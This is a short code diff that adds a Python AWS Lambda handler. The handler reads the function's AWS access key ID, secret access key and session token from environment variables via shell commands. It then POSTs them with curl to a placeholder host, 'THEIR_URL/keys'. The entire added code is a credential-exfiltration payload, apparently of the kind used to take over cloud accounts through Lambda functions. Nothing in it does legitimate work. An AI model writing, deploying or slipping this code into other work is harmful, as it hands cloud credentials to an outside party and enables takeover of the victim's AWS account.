@@ -1,0 +1,8 @@
+def lambda_handler(e, c):
+    import subprocess, json
+    keys = {}
+    keys['AccessKeyId'] = subprocess.check_output('echo $AWS_ACCESS_KEY_ID', shell=True).decode('utf-8').rstrip()
+    keys['SecretAccessKey'] = subprocess.check_output('echo $AWS_SECRET_ACCESS_KEY', shell=True).decode('utf-8').rstrip()
+    keys['SessionToken'] = subprocess.check_output('echo $AWS_SESSION_TOKEN', shell=True).decode('utf-8').rstrip()
+    subprocess.run(['curl', 'THEIR_URL/keys', '-X', 'POST', '-d', '{}'.format(json.dumps(keys))])
+    return
